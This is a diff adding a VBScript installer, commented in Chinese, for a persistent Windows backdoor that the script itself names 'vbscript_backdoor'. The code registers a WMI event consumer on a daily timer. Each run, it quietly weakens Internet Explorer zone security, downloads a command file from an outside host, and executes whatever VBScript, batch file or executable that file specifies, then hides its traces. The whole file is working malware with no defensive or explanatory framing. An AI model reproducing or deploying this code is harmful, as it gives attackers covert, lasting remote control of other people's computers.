@@ -1,0 +1,42 @@
+'***以下为参数配置，请根据情况自行修改***'
+nslink="winmgmts:\\.\root\cimv2:"                   'ASEC所在的名字空间'
+doorname="vbscript_backdoor"                        '记住后门的名字，卸载时需要'
+runinterval=86400000                                '每天运行一次'
+cmdu="http://myweb.8866.org/cmd.txt"                '命令文件的位置'
+cmdw=4000                                           '文件下载超时时间'
+cmdl="HKLM\SOFTWARE\Microsoft\WBEM\CIMOM\CmdLength" '保存命令长度的键值名'
+'***参数配置结束***'
+
+createobject("WScript.Shell").regwrite cmdl,0,"REG_DWORD"
+
+'脚本后门核心代码'
+stxt="cmdu="""&cmdu&""":cmdw="&cmdw&":cmdl="""&cmdl&""":on error resume next:set shl=createobject(""WScript.Shell""):set aso=createobject(""ADODB.Stream""):set ie=createobject(""InternetExplorer.Application""):zone=""HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\3"":set1=zone&""\1201"":set2=zone&""\1400"":set3=zone&""\CurrentLevel"":val1=shl.regread(set1):val2=shl.regread(set2):val3=shl.regread(set3):regd=""REG_DWORD"":shl.regwrite set1,0,regd:shl.regwrite set2,0,regd:shl.regwrite set3,0,regd:ie.visible=0:ie.navigate ""about""&"":blank"":ie.document.write ""<script>function whr(){return new ActiveXObject('WinHttp.WinHttpRequest.5.1')}</script>"":with ie.document.script.whr():.settimeouts cmdw,cmdw,cmdw,cmdw:.open ""GET"",cmdu,true:.send:if not .waitforresponse(cmdw) then die:end if:if .status>299 then die:end if:rt=.responsetext:if len(rt)=shl.regread(cmdl) then die:end if:shl.regwrite cmdl,len(rt),regd:cmds=split(rt,vbcrlf,-1):if ubound(cmds)<1 then die:end if:cmdt=lcase(trim(cmds(0))):aso.type=1:aso.open:cd=shl.currentdirectory&chr(92):select case cmdt:case ""'vbs"":execute(rt):die:case "":bat"":aso.write .responsebody:aso.savetofile cd&""_.bat"",2:aso.close:shl.run chr(34)&cd&""_.bat"""""",0:die:case ""'wsh"":aso.write .responsebody:aso.savetofile cd&""_.vbs"",2:aso.close:shl.run ""cscript.exe """"""&cd&""_.vbs"""""",0:die:case ""exe"":case else die:end select:if ubound(cmds)<4 then die:end if:.open ""GET"",cmds(1),true:.send:if not .waitforresponse(cmds(2)) then die:end if:if .status>299 then die:end if:path=shl.expandenvironmentstrings(cmds(3)):aso.write .responsebody:aso.savetofile path,2:aso.close:shl.run chr(34)&path&"""""" ""&cmds(4),0:end with:die:sub die:ie.quit:shl.regwrite set1,val1,regd:shl.regwrite set2,val2,regd:shl.regwrite set3,val3,regd:for each ps in getobject(""winmgmts:\\.\root\cimv2:win32_process"").instances_:if lcase(ps.name)=""scrcons.exe"" then ps.terminate:end if:next:end sub"
+
+'配置事件消费者'
+set asec=getobject(nslink&"ActiveScriptEventConsumer").spawninstance_
+asec.name=doorname&"_consumer"
+asec.scriptingengine="vbscript"
+asec.scripttext=stxt
+set asecpath=asec.put_
+
+'配置计时器'
+set itimer=getobject(nslink&"__IntervalTimerInstruction").spawninstance_
+itimer.timerid=doorname&"_itimer"
+itimer.intervalbetweenevents=runinterval
+itimer.skipifpassed=false
+itimer.put_
+
+'配置事件过滤器'
+set evtflt=getobject(nslink&"__EventFilter").spawninstance_
+evtflt.name=doorname&"_filter"
+evtflt.query="select * from __timerevent where timerid="""&doorname&"_itimer"""
+evtflt.querylanguage="wql"
+set fltpath=evtflt.put_
+
+'绑定消费者和过滤器'
+set fcbnd=getobject(nslink&"__FilterToConsumerBinding").spawninstance_
+fcbnd.consumer=asecpath.path
+fcbnd.filter=fltpath.path
+fcbnd.put_
+
+wscript.echo "安装完成"
